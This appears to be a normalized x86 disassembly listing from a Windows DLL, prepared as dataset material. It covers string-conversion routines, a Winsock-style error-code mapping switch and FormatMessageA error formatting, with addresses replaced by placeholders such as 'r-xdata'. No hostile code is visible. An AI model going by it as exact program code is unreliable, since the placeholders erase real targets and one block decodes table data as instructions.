mov [ ebp - 0x1c ] esi
push [ ebp - 0x14 ]
and [ ebp - 0x4 ] 0x0
push [ ebp - 0x10 ]
lea eax [ esi + ebx ]
push eax
push esi
push edi
push [ ebp - 0x18 ]
call sub_1003d7d6
push esi
call sub_10024d36
add esp 0x20
jmp r-xdata
sub_1003d915
push ebp
mov ebp esp
push esi
push edi
call [ AreFileApisANSI@IAT ]
mov esi [ ebp + 0x18 ]
mov ecx [ ebp + 0x1c ]
mov edi [ ebp + 0x10 ]
neg eax
sbb eax eax
sub ecx esi
sar ecx 0x1
push ecx
push esi
mov ecx edi
sub ecx [ ebp + 0xc ]
and eax 0x2
push ecx
push [ ebp + 0xc ]
inc eax
push 0x1
push eax
call [ MultiByteToWideChar@IAT ]
test eax eax
jne r-xdata
mov ecx [ ebp + 0x14 ]
mov [ ecx ] edi
mov ecx [ ebp + 0x20 ]
lea eax [ esi + eax * 2 ]
mov [ ecx ] eax
xor ecx ecx
mov [ eax ] cx
xor eax eax
push 0x2
pop eax
jmp r-xdata
pop edi
pop esi
pop ebp
retn 0x1c
sub_1003d96c
push ebp
mov ebp esp
push esi
push edi
call [ AreFileApisANSI@IAT ]
mov esi [ ebp + 0x18 ]
mov ecx [ ebp + 0x1c ]
mov edi [ ebp + 0x10 ]
push 0x0
neg eax
sbb eax eax
push 0x0
sub ecx esi
push ecx
mov ecx edi
sub ecx [ ebp + 0xc ]
push esi
sar ecx 0x1
push ecx
push [ ebp + 0xc ]
and eax 0x2
inc eax
push 0x400
push eax
call [ WideCharToMultiByte@IAT ]
test eax eax
jne r-xdata
mov ecx [ ebp + 0x14 ]
mov [ ecx ] edi
mov ecx [ ebp + 0x20 ]
add eax esi
mov [ ecx ] eax
mov [ eax ] 0x0
xor eax eax
push 0x2
pop eax
jmp r-xdata
pop edi
pop esi
pop ebp
retn 0x1c
sub_1003d9c7
mov eax [ esp + 0x4 ]
mov edx [ eax + 0x4 ]
mov ecx [ esp + 0x8 ]
cmp edx [ ecx + 0x4 ]
jne r-xdata
xor eax eax
retn
mov eax [ eax ]
cmp eax [ ecx ]
jne r-xdata
xor eax eax
inc eax
retn
sub_1003d9f4
push ebp
mov ebp esp
push ecx
push ecx
push [ ebp + 0xc ]
mov eax [ ecx ]
push [ ebp + 0x8 ]
lea edx [ ebp - 0x8 ]
push edx
call [ eax + 0xc ]
push eax
call sub_1003d9c7
pop ecx
pop ecx
leave
retn 0x8
sub_1003da35
push 0x0
mov eax sub_1004bc78
call sub_10028203
test [ rw-data ] 0x1
jne r-xdata
mov eax rw-data
call sub_100282db
retn
or [ rw-data ] 0x1
and [ esp + 0x18 ] 0x0
push sub_1004fdcd
mov [ rw-data ] r--data
call sub_10028434
pop ecx
sub_1003da76
push 0x8
mov eax sub_1004bcac
call sub_10028203
mov esi [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
and [ ebp - 0x10 ] 0x0
mov ecx esi
mov [ ebp - 0x14 ] esi
call sub_10003d21
mov eax [ ebp + 0xc ]
and [ ebp - 0x4 ] 0x0
sub eax 0x0
mov [ ebp - 0x10 ] 0x1
je r-xdata
push r--data
dec eax
je r-xdata
push r--data
jmp r-xdata
dec eax
je r-xdata
mov ecx esi
push r--data
jmp r-xdata
dec eax
mov ecx esi
je r-xdata
push r--data
jmp r-xdata
push r--data
jmp r-xdata
call sub_10001c62
mov eax esi
call sub_100282db
retn 0x8
sub_1003db19
push 0x0
mov eax sub_1004bcd5
call sub_10028203
test [ rw-data ] 0x1
jne r-xdata
mov eax rw-data
call sub_100282db
retn
or [ rw-data ] 0x1
and [ esp + 0x18 ] 0x0
push sub_1004fdd8
mov [ rw-data ] r--data
call sub_10028434
pop ecx
sub_1003db5a
push 0x0
mov eax sub_1004bcfe
call sub_10028203
test [ rw-data ] 0x1
jne r-xdata
mov eax rw-data
call sub_100282db
retn
or [ rw-data ] 0x1
and [ esp + 0x18 ] 0x0
push sub_1004fde3
mov [ rw-data ] r--data
call sub_10028434
pop ecx
sub_1003db9b
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0xc ]
cmp esi 0x19
jg r-xdata
mov eax 0x271d
cmp esi eax
jg r-xdata
je r-xdata
lea eax [ esi - 0x271e ]
cmp eax 0x33
ja r-xdata
je r-xdata
call sub_1003db5a
mov ecx eax
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x5
jmp r-xdata
cmp esi 0x15
ja r-xdata
call sub_1003db19
mov ecx eax
mov eax [ ebp + 0x8 ]
mov [ eax ] esi
movzx eax [ eax + lookup_table_1003e167 ]
jmp [ eax * 4 + jump_table_1003e0f3 ]
call sub_1003db5a
mov ecx eax
mov eax [ ebp + 0x8 ]
mov [ eax ] 0xd
jmp r-xdata
mov eax 0x91
cmp esi eax
jg r-xdata
mov [ eax + 0x4 ] ecx
pop esi
pop ebp
retn 0x8
jmp [ esi * 4 + jump_table_1003e09b ]
call sub_1003db5a
mov ecx eax
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x16
jmp r-xdata
call sub_1003db5a
mov ecx eax
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x18
jmp r-xdata
call sub_1003db5a
mov ecx eax
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x26
jmp r-xdata
call sub_1003db5a
mov ecx eax
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x26ae
jmp r-xdata
call sub_1003db5a
mov ecx eax
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x26af
jmp r-xdata
call sub_1003db5a
mov ecx eax
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x26ad
jmp r-xdata
call sub_1003db5a
mov ecx eax
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x26b3
jmp r-xdata
call sub_1003db5a
mov ecx eax
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x26b2
jmp r-xdata
call sub_1003db5a
mov ecx eax
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x26b4
jmp r-xdata
call sub_1003db5a
mov ecx eax
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x26b5
jmp r-xdata
call sub_1003db5a
mov ecx eax
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x26b6
jmp r-xdata
call sub_1003db5a
mov ecx eax
mov eax [ ebp + 0x8 ]
mov [ eax ] 0xe
jmp r-xdata
call sub_1003db5a
mov ecx eax
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x26b7
jmp r-xdata
call sub_1003db5a
mov ecx eax
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x26c8
jmp r-xdata
call sub_1003db5a
mov ecx eax
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x26b0
jmp r-xdata
call sub_1003db5a
mov ecx eax
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x26b9
jmp r-xdata
call sub_1003db5a
mov ecx eax
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x26ba
jmp r-xdata
call sub_1003db5a
mov ecx eax
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x26bb
jmp r-xdata
call sub_1003db5a
mov ecx eax
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x26bc
jmp r-xdata
call sub_1003db5a
mov ecx eax
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x26bd
jmp r-xdata
call sub_1003db5a
mov ecx eax
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x26c1
jmp r-xdata
call sub_1003db5a
mov ecx eax
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x26c5
jmp r-xdata
call sub_1003db5a
mov ecx eax
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x26c3
jmp r-xdata
call sub_1003db5a
mov ecx eax
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x26c9
jmp r-xdata
call sub_1003db5a
mov ecx eax
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x26cd
jmp r-xdata
call sub_1003db5a
mov ecx eax
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x26d5
jmp r-xdata
call sub_1003db5a
mov ecx eax
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x26d2
jmp r-xdata
call sub_1003db5a
mov ecx eax
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x26ca
jmp r-xdata
mov eax 0x3f4
cmp esi eax
jg r-xdata
je r-xdata
call sub_1003db5a
mov ecx eax
mov eax [ ebp + 0x8 ]
and [ eax ] 0x0
jmp r-xdata
call sub_1003db5a
mov ecx eax
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x13
jmp r-xdata
call sub_1003db5a
mov ecx eax
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x2
jmp r-xdata
call sub_1003db5a
mov ecx eax
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x28
jmp r-xdata
call sub_1003db5a
mov ecx eax
mov eax [ ebp + 0x8 ]
mov [ eax ] 0xc
jmp r-xdata
call sub_1003db5a
mov ecx eax
mov eax [ ebp + 0x8 ]
mov [ eax ] 0xb
jmp r-xdata
call sub_1003db5a
mov ecx eax
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x12
jmp r-xdata
mov eax esi
sub eax 0x3f5
je r-xdata
je r-xdata
call sub_1003db5a
mov ecx eax
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x29
jmp r-xdata
cmp esi 0x52
jg r-xdata
sub eax 0xe0
je r-xdata
mov eax esi
sub eax 0xaa
je r-xdata
mov eax esi
sub eax 0x6e
je r-xdata
je r-xdata
sub eax 0x48c
je r-xdata
call sub_1003db5a
mov ecx eax
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x10
jmp r-xdata
sub eax 0xd
je r-xdata
dec eax
je r-xdata
mov eax esi
sub eax 0x1d
je r-xdata
sub eax 0x3
je r-xdata
call sub_1003db5a
mov ecx eax
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x11
jmp r-xdata
sub eax 0x1d
je r-xdata
dec eax
je r-xdata
dec eax
je r-xdata
sub eax 0x1db0
je r-xdata
call sub_1003db5a
mov ecx eax
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x27
jmp r-xdata
sub eax 0x37
je r-xdata
call sub_1003db5a
mov ecx eax
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x1c
jmp r-xdata
sub eax 0xb
je r-xdata
dec eax
dec eax
je r-xdata
call sub_1003db5a
mov ecx eax
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x4
jmp r-xdata
sub eax 0x5
jne r-xdata
sub eax 0x2d8
je r-xdata
sub eax 0x8
je r-xdata
dec eax
je r-xdata
call sub_1003db5a
mov ecx eax
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x9
jmp r-xdata
call sub_1003db5a
mov ecx eax
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x26c7
jmp r-xdata
sub eax 0x3
je r-xdata
sub eax 0xb
jne r-xdata
sub eax 0x6
je r-xdata
sub eax 0xd
je r-xdata
sub eax 0x10
je r-xdata
sub eax 0x19
jne r-xdata
sub_1003e184
or ebx [ esp + ecx ]
sbb al 0xd
push cs
movups xmm2 [ ecx ]
adc dl [ ebx ]
adc al 0x15
push ss
pop ss
sbb al 0x1c
sbb [ ecx ] bl
sbb al 0x1a
sbb al 0x1b
push 0x20
mov eax sub_1004bd59
call sub_10028203
and [ ebp - 0x10 ] 0x0
xor ebx ebx
inc ebx
mov esi rw-data
test [ rw-data ] bl
jne r-xdata
push [ ebp + 0xc ]
call sub_1004b442
pop ecx
test eax eax
je r-xdata
or [ rw-data ] ebx
push r--data
mov ecx esi
mov [ ebp - 0x4 ] ebx
call sub_10001c7f
push sub_1004fdee
call sub_10028434
pop ecx
mov [ ebp - 0x4 ] 0x0
mov eax esi
push eax
lea ecx [ ebp - 0x2c ]
call sub_10001c7f
mov [ ebp - 0x4 ] 0x2
mov [ ebp - 0x10 ] ebx
jmp r-xdata
mov eax [ ebp + 0x8 ]
call sub_100282db
retn 0x8
and [ ebp - 0x10 ] 0xfffffffe
push 0x0
push ebx
lea ecx [ ebp - 0x2c ]
call sub_10002020
mov ecx [ ebp + 0x8 ]
push eax
call sub_10001fc2
or [ ebp - 0x10 ] 0x2
and [ ebp - 0x4 ] 0x0
test [ ebp - 0x10 ] bl
je r-xdata
sub_1003e233
push 0x30
mov eax sub_1004bd9d
call sub_1002826c
mov edi [ ebp + 0x8 ]
xor ebx ebx
push ebx
push ebx
lea eax [ ebp - 0x38 ]
push eax
push 0x400
push [ ebp + 0xc ]
mov [ ebp - 0x34 ] ebx
push ebx
push 0x1300
mov [ ebp - 0x3c ] edi
mov [ ebp - 0x38 ] ebx
call [ FormatMessageA@IAT ]
mov ecx [ ebp - 0x38 ]
mov [ ebp - 0x30 ] ecx
xor esi esi
inc esi
mov [ ebp - 0x4 ] esi
cmp eax ebx
jne r-xdata
push ecx
lea ecx [ ebp - 0x2c ]
call sub_10001c7f
mov [ ebp - 0x4 ] 0x2
cmp [ ebp - 0x18 ] ebx
je r-xdata
push r--data
mov ecx edi
call sub_10001c7f
mov [ ebp - 0x34 ] esi
jmp r-xdata
lea eax [ ebp - 0x2c ]
push eax
mov ecx edi
call sub_10001fc2
push ebx
push esi
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x34 ] esi
mov [ ebp - 0x4 ] 0x1
call sub_10002020
mov eax [ ebp - 0x18 ]
dec eax
push eax
lea ecx [ ebp - 0x2c ]
call sub_10007b0c
cmp [ eax ] 0xa
je r-xdata
push [ ebp - 0x30 ]
mov [ ebp - 0x4 ] bl
call [ LocalFree@IAT ]
mov eax edi
call sub_100282ef
retn 0x8
mov eax [ ebp - 0x18 ]
push 0xffffffff
dec eax
push eax
lea ecx [ ebp - 0x2c ]
call sub_10001cd9
cmp [ ebp - 0x18 ] ebx
jne r-xdata
mov eax [ ebp - 0x18 ]
dec eax
push eax
lea ecx [ ebp - 0x2c ]
call sub_10007b0c
cmp [ eax ] 0xd
jne r-xdata
mov eax [ ebp - 0x18 ]
cmp eax ebx
je r-xdata
dec eax
push eax
lea ecx [ ebp - 0x2c ]
call sub_10007b0c
cmp [ eax ] 0x2e
jne r-xdata
mov eax [ ebp - 0x18 ]
push 0xffffffff
dec eax
push eax
lea ecx [ ebp - 0x2c ]
call sub_10001cd9
sub_1003e344
push 0x10
mov eax sub_1004bdca
call sub_10028203
push 0x0
lea ecx [ ebp - 0x10 ]
call sub_100230bc
mov esi [ ebp + 0x8 ]
mov ebx [ ebp + 0x10 ]
and [ ebp - 0x4 ] 0x0
cmp [ esi + 0xc ] ebx
ja r-xdata
mov ecx [ ebp + 0xc ]
call sub_10003a56
mov eax [ esi + 0x8 ]
mov edi ebx
shl edi 0x2
add eax edi
cmp [ eax ] 0x0
je r-xdata
lea edi [ ebx + 0x1 ]
cmp edi 0x28
jae r-xdata
mov eax [ esi + 0x8 ]
mov ecx [ ebp + 0xc ]
or [ ebp - 0x4 ] 0xffffffff
mov [ edi + eax ] ecx
lea ecx [ ebp - 0x10 ]
call sub_100230e4
call sub_100282db
retn
mov ecx [ eax ]
call sub_10003c0e
test eax eax
je r-xdata
mov eax edi
shl eax 0x2
push eax
push [ esi + 0x8 ]
call sub_1002a091
pop ecx
pop ecx
test eax eax
jne r-xdata
push 0x28
pop edi
mov edx [ eax ]
push 0x1
mov ecx eax
call [ edx ]
mov [ esi + 0x8 ] eax
jmp r-xdata
test [ rw-data ] 0x1
mov esi rw-data
jne r-xdata
cmp [ esi + 0xc ] edi
jb r-xdata
push esi
lea ecx [ ebp - 0x1c ]
call sub_10001d8e
push r--data
lea eax [ ebp - 0x1c ]
push eax
call sub_10027dd1
or [ rw-data ] 0x1
mov ecx esi
call sub_1002436e
push sub_1004fe11
call sub_10028434
pop ecx
mov eax [ esi + 0xc ]
mov ecx [ esi + 0x8 ]
and [ ecx + eax * 4 ] 0x0
inc [ esi + 0xc ]
sub_1003e43f
push 0x20
mov eax sub_1004bdf7
call sub_10028203
mov eax [ ebp + 0xc ]
xor edi edi
mov [ ebp - 0x10 ] edi
mov esi [ ebp + 0x10 ]
and eax 0x2
mov [ ebp - 0x10 ] eax
je r-xdata
mov eax [ ebp + 0xc ]
and eax 0x8
mov [ ebp + 0x10 ] eax
je r-xdata
cmp [ ebp + 0x14 ] edi
jne r-xdata
cmp [ ebp + 0x10 ] edi
je r-xdata
cmp [ ebp + 0x14 ] edi
jne r-xdata
mov ecx rw-data
call sub_10003459
push eax
push [ ebp + 0x14 ]
call sub_1000cd79
pop ecx
push eax
push 0x18
call sub_10024389
pop ecx
cmp eax edi
je r-xdata
cmp [ ebp - 0x10 ] edi
je r-xdata
cmp [ ebp + 0x14 ] edi
jne r-xdata
mov ecx rw-data
call sub_10003459
push eax
push [ ebp + 0x14 ]
call sub_1000c1d0
pop ecx
push eax
push 0x10
call sub_10024389
pop ecx
cmp eax edi
je r-xdata
xor ebx ebx
push edi
push [ ebp + 0x8 ]
mov ecx eax
call sub_1000ccb9
mov ebx eax
jmp r-xdata
push [ ebp + 0x14 ]
mov ebx [ ebp + 0x8 ]
push esi
push [ ebp + 0xc ]
push ebx
call sub_1004ae18
push [ ebp + 0x14 ]
push esi
push [ ebp + 0xc ]
push ebx
call sub_10047bdf
push [ ebp + 0x14 ]
push esi
push [ ebp + 0xc ]
push ebx
call sub_10048070
mov eax [ ebp + 0xc ]
or [ esi + 0x10 ] eax
add esp 0x30
lea eax [ ebp - 0x2c ]
push eax
mov ecx ebx
call sub_1003e422
push eax
lea ecx [ esi + 0x18 ]
mov [ ebp - 0x4 ] 0x12
call sub_10005862
push edi
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_10002020
mov eax esi
call sub_100282db
retn
cmp [ ebp + 0x14 ] edi
jne r-xdata
mov ecx rw-data
call sub_10003459
push eax
push [ ebp + 0x14 ]
call sub_1000c133
pop ecx
push eax
push 0x10
call sub_10024389
pop ecx
cmp eax edi
je r-xdata
xor ebx ebx
push edi
push [ ebp + 0x8 ]
mov ecx eax
call sub_1000c6ad
mov ebx eax
jmp r-xdata
mov ecx esi
call sub_1003c98f
mov ecx rw-data
call sub_10003459
push eax
push ebx
jmp r-xdata
mov ecx rw-data
call sub_10003459
push eax
push [ ebp + 0x14 ]
call sub_10010d09
pop ecx
push eax
push 0x8
call sub_10024389
pop ecx
cmp eax edi
je r-xdata
cmp [ ebp + 0x14 ] edi
jne r-xdata
xor ebx ebx
push edi
push [ ebp + 0x8 ]
mov ecx eax
call sub_1000c68c
mov ebx eax
jmp r-xdata
mov ecx esi
call sub_1003c98f
mov ecx rw-data
call sub_10003459
push eax
push ebx
jmp r-xdata
xor ebx ebx
mov [ eax + 0x4 ] edi
mov [ eax ] r--data
mov ebx eax
jmp r-xdata
mov ecx rw-data
call sub_10003459
push eax
push [ ebp + 0x14 ]
call sub_1000c26d
pop ecx
push eax
push 0x18
call sub_10024389
pop ecx
mov ecx eax
mov [ ebp + 0x10 ] ecx
mov [ ebp - 0x4 ] 0xe
cmp ecx edi
je r-xdata
mov ecx esi
call sub_1003c98f
cmp [ ebp + 0x10 ] edi
je r-xdata
mov ecx rw-data
call sub_10003459
push eax
push ebx
jmp r-xdata
mov ecx esi
call sub_1003c98f
mov ecx rw-data
call sub_10003459
push eax
push ebx
jmp r-xdata
xor ebx ebx
push edi
push edi
push [ ebp + 0x8 ]
call sub_1000c6ce
mov ebx eax
jmp r-xdata
mov ecx esi
call sub_1003c98f
or [ ebp - 0x4 ] 0xffffffff
mov ecx rw-data
call sub_10003459
push eax
push ebx
jmp r-xdata
sub_1003e666
push 0x88
mov eax sub_1004be28
call sub_1002826c
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
cmp ebx [ rw-data ]
jne r-xdata
push 0x0
lea ecx [ ebp - 0x88 ]
call sub_100230bc
mov eax [ esi + 0xc ]
xor edi edi
inc edi
mov [ ebp - 0x4 ] edi
test eax eax
jbe r-xdata
push r--data
lea ecx [ ebp - 0x84 ]
call sub_1003d393
and [ ebp - 0x4 ] 0x0
push 0x0
push esi
lea eax [ ebp - 0x84 ]
push 0x3f
push eax
call sub_1003e43f
or [ ebp - 0x4 ] 0xffffffff
add esp 0x10
lea ecx [ ebp - 0x84 ]
call sub_1000384f
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x88 ]
call sub_100230e4
shl eax 0x2
push eax
call sub_1002a000
pop ecx
mov [ esi + 0x8 ] eax
test eax eax
jne r-xdata
call sub_100282ef
retn
mov edi [ esi + 0xc ]
jmp r-xdata
test [ rw-data ] 0x1
mov esi rw-data
jne r-xdata
test edi edi
ja r-xdata
push esi
lea ecx [ ebp - 0x94 ]
call sub_10001d8e
push r--data
lea eax [ ebp - 0x94 ]
push eax
call sub_10027dd1
or [ rw-data ] edi
mov ecx esi
call sub_1002436e
push sub_1004fdfd
call sub_10028434
pop ecx
mov eax [ ebx + 0x8 ]
dec edi
mov ecx [ eax + edi * 4 ]
mov eax [ esi + 0x8 ]
mov [ eax + edi * 4 ] ecx
test ecx ecx
je r-xdata
call sub_10003a56
sub_1003e793
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push [ ebp + 0x10 ]
and [ ebp - 0x4 ] 0x0
and [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0x8 ]
push eax
push 0x1
lea eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
call sub_1002382a
mov ax [ ebp - 0x4 ]
add esp 0x14
leave
retn
sub_1003e7c1
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
push edi
push [ ebp + 0x8 ]
xor edi edi
mov [ ebp - 0xc ] edi
call sub_10024630
mov esi eax
mov eax [ ebp + 0x8 ]
inc esi
pop ecx
mov ebx esi
mov [ ebp - 0x8 ] eax
je r-xdata
inc edi
xor ecx ecx
push 0x2
pop edx
mov eax edi
mul edx
seto cl
neg ecx
or ecx eax
push ecx
call sub_10024077
and [ ebp - 0x10 ] 0x0
mov ebx eax
pop ecx
mov [ ebp - 0x8 ] ebx
jmp r-xdata
push [ ebp + 0x10 ]
lea eax [ ebp - 0xc ]
push eax
push ebx
push [ ebp - 0x8 ]
lea eax [ ebp - 0x4 ]
push eax
call sub_1002382a
add esp 0x14
test eax eax
jle r-xdata
test edi edi
ja r-xdata
add [ ebp - 0x8 ] eax
sub ebx eax
inc edi
test ebx ebx
ja r-xdata
push [ ebp + 0x10 ]
lea eax [ ebp - 0x10 ]
push eax
push esi
push [ ebp + 0x8 ]
push ebx
call sub_1002382a
add esp 0x14
test eax eax
jle r-xdata
pop edi
xor eax eax
mov [ ebx ] ax
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
leave
retn
add [ ebp + 0x8 ] eax
dec edi
inc ebx
inc ebx
sub_1003e85e
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
push edi
lea eax [ ebp - 0x10 ]
mov ebx ecx
mov ecx [ ebp + 0x8 ]
push eax
call sub_10003756
mov ecx [ ebp + 0x8 ]
mov esi eax
lea edi [ ebx + 0x8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea eax [ ebp - 0x8 ]
push eax
movsd [ edi ] [ esi ]
call sub_10003779
mov ecx [ eax ]
mov [ ebx + 0x18 ] ecx
mov eax [ eax + 0x4 ]
pop edi
pop esi
mov [ ebx + 0x1c ] eax
pop ebx
leave
retn 0x4
sub_1003e8c7
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push esi
lea eax [ ebp - 0x8 ]
mov esi ecx
mov ecx [ ebp + 0x8 ]
push eax
call sub_10003779
mov ecx [ eax ]
mov [ esi + 0x8 ] ecx
mov eax [ eax + 0x4 ]
mov [ esi + 0xc ] eax
pop esi
leave
retn 0x4
sub_1003e8ed
mov edi edi
push esi
mov esi ecx
push [ esi + 0x8 ]
call sub_10024d36
push [ esi + 0x10 ]
call sub_10024d36
push [ esi + 0x14 ]
call sub_10024d36
push [ esi + 0x18 ]
call sub_10024d36
add esp 0x10
pop esi
retn
sub_1003e930
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push esi
lea eax [ ebp - 0x8 ]
mov esi ecx
mov ecx [ ebp + 0x8 ]
push eax
call sub_10003779
mov ecx [ eax ]
mov [ esi + 0xc ] ecx
mov eax [ eax + 0x4 ]
mov ecx [ ebp + 0x8 ]
mov [ esi + 0x10 ] eax
lea eax [ ebp + 0x8 ]
push eax
call sub_1003e779
mov ecx [ eax ]
mov [ esi + 0x8 ] ecx
and [ eax ] 0x0
push [ ebp + 0x8 ]
call sub_10024aba
pop ecx
pop esi
leave
retn 0x4
sub_1003e973
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push esi
push [ ebp + 0x8 ]
mov esi ecx
mov [ esi + 0x4 ] eax
mov [ esi ] r--data
call sub_1003e8c7
mov eax esi
pop esi
pop ebp
retn 0x8
sub_1003e996
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x10 ]
push esi
mov esi [ ebp + 0x14 ]
mov [ esi ] eax
mov eax [ ebp + 0x18 ]
push edi
mov edi [ ebp + 0x20 ]
mov [ ebp - 0x4 ] ecx
xor ecx ecx
mov [ edi ] eax
mov eax [ esi ]
cmp eax ebx
setne cl
mov [ ebp + 0x14 ] ecx
cmp eax ebx
je r-xdata
mov eax [ ebp + 0x14 ]
mov ecx [ edi ]
cmp ecx [ ebp + 0x1c ]
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ esi ]
add edx 0x8
push edx
push [ ebp + 0x8 ]
mov edx ebx
sub edx eax
push edx
push eax
push ecx
call sub_1002382a
add esp 0x14
cmp eax 0xfffffffe
je r-xdata
mov [ esi ] ebx
cmp eax 0xffffffff
je r-xdata
push 0x2
pop eax
jmp r-xdata
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x1c
cmp eax 0xfffffffd
jne r-xdata
mov ecx [ edi ]
cmp [ ecx ] ax
jne r-xdata
add [ esi ] eax
add [ edi ] 0x2
and [ ebp + 0x14 ] 0x0
cmp [ esi ] ebx
jne r-xdata
xor eax eax
push [ esi ]
call sub_10024630
pop ecx
inc eax
jmp r-xdata
sub_1003ea2c
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x1c ]
push ebx
mov ebx [ ebp + 0x8 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x14 ]
mov [ esi ] eax
mov eax [ ebp + 0x18 ]
push edi
mov edi [ ebp + 0x20 ]
xor edx edx
mov [ edi ] eax
mov eax [ esi ]
cmp eax [ ebp + 0x10 ]
mov [ ebp - 0x20 ] ecx
setne dl
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x10 ] edx
cmp eax [ ebp + 0x10 ]
je r-xdata
mov eax [ ebp - 0x10 ]
jmp r-xdata
mov eax [ edi ]
cmp eax [ ebp - 0x14 ]
je r-xdata
mov edx [ ebp - 0x14 ]
add ecx 0x8
sub edx eax
cmp edx 0x5
push ecx
push ebx
jl r-xdata
mov eax [ ebx ]
mov [ ebp - 0x1c ] eax
mov eax [ esi ]
movzx eax [ eax ]
push eax
lea eax [ ebp - 0xc ]
push eax
call sub_100234f0
mov ebx eax
add esp 0x10
test ebx ebx
jl r-xdata
mov ecx [ esi ]
movzx ecx [ ecx ]
push ecx
push eax
call sub_100234f0
add esp 0x10
test eax eax
jl r-xdata
push 0x2
pop eax
jmp r-xdata
mov eax [ edi ]
mov ecx [ ebp - 0x14 ]
sub ecx eax
cmp ecx ebx
jl r-xdata
add [ esi ] 0x2
add [ edi ] eax
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_100242d7
leave
retn 0x1c
mov eax [ ebp - 0x1c ]
mov ecx [ ebp - 0x18 ]
mov [ ecx ] eax
push ebx
lea edx [ ebp - 0xc ]
push edx
push ecx
push eax
call sub_100242f1
add [ esi ] 0x2
add esp 0x10
add [ edi ] ebx
mov ebx [ ebp - 0x18 ]
mov eax [ ebp + 0x10 ]
and [ ebp - 0x10 ] 0x0
cmp [ esi ] eax
jne r-xdata
mov ecx [ ebp - 0x20 ]
jmp r-xdata
sub_1003eb20
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
and [ ebp - 0x10 ] 0x0
push ebx
push esi
mov esi [ ebp + 0x14 ]
mov eax ecx
mov ecx [ ebp + 0x10 ]
push edi
mov edi [ ebp + 0x8 ]
add eax 0x8
push eax
mov [ ebp - 0x14 ] ecx
mov ecx [ ebp + 0xc ]
push edi
mov [ esi ] ecx
mov ecx [ edi ]
lea eax [ ebp - 0xc ]
push 0x0
push eax
mov [ ebp - 0x18 ] ecx
call sub_100234f0
mov ebx eax
add esp 0x10
test ebx ebx
jg r-xdata
mov eax [ esi ]
mov ecx [ ebp - 0x14 ]
dec ebx
sub ecx eax
cmp ecx ebx
jge r-xdata
mov [ ebp - 0x10 ] 0x2
jmp r-xdata
test ebx ebx
jle r-xdata
mov eax [ ebp - 0x18 ]
mov [ edi ] eax
mov [ ebp - 0x10 ] 0x1
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov eax [ ebp - 0x10 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_100242d7
leave
retn 0x10
push ebx
lea edx [ ebp - 0xc ]
push edx
push ecx
push eax
call sub_100242f1
add esp 0x10
add [ esi ] ebx
sub_1003ebb6
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
